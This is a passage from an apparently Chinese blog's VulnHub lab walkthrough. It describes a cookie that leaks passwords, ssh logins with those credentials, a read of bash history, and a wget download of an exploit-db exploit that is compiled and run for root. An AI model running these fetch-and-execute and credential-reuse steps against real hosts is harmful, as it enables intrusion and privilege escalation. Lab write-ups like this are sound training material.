href=\"#cookie-密码泄漏\">#</a> cookie 密码泄漏</h3>\n<p>继续访问前边扫描到的 url 地址，看是否有可疑目录<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTAyL2QxOGUxZTIyYmVjYmQ5MTViNDVlMGU2NTU0MjlkNDg3L3dwLWNvbnRlbnQvdXBsb2Fkcy8=\"> http://192.168.31.102/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-472.png\" alt></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTAyL2QxOGUxZTIyYmVjYmQ5MTViNDVlMGU2NTU0MjlkNDg3L3dwLWNvbnRlbnQvdXBsb2Fkcy9UYWxrJTIwVG8lMjBWQUxBSy8=\">http://192.168.31.102/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/Talk To VALAK/</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-473.png\" alt></p>\n<p>看到一个可以输入语句的对话框，在这里输入个用户名试试什么效果</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-474.png\" alt></p>\n<p>输入用户名后，网站的 cookie 信息中爆出来了一个密码；切换用户，输入 krampus 用户，查看到了他的密码</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-475.png\" alt></p>\n<p>-&gt; valak：M4k3Ad3a1 krampus：M4k3Ad3a1</p>\n<p>用 ssh 尝试这两个用户的登录名和密码，进入服务器<br>\n <code>ssh 192.168.31.102 -l valak</code> <br>\n <code>ssh 192.168.31.102 -l krampus</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-476.png\" alt></p>\n<p>-&gt; 成功拿到了 krampus 的权限，进入到了服务器</p>\n<h3 id=\"bash_history-查看\"><a class=\"markdownIt-Anchor\" href=\"#bash_history-查看\">#</a> .bash_history 查看</h3>\n<p>cat ~/.bash_history 查看历史命令</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-477.png\" alt></p>\n<p>看到之前有操作过这些命令，很有可能就是提权命令，复现此 exp<br>\n <code>wget http://www.exploit-db.com/download/47009</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-478.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用exp</span></span><br><span class=\"line\">mv 47009 ./exp.c</span><br><span class=\"line\">gcc exp.c -o exp</span><br><span class=\"line\">./exp</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-479.png\" alt></p>\n<p>-&gt; 提权成功，拿到了 root 账户的权限</p>\n",
            "tags": [
                "VULNHUB 11-20"
            ]
        }
    ]
}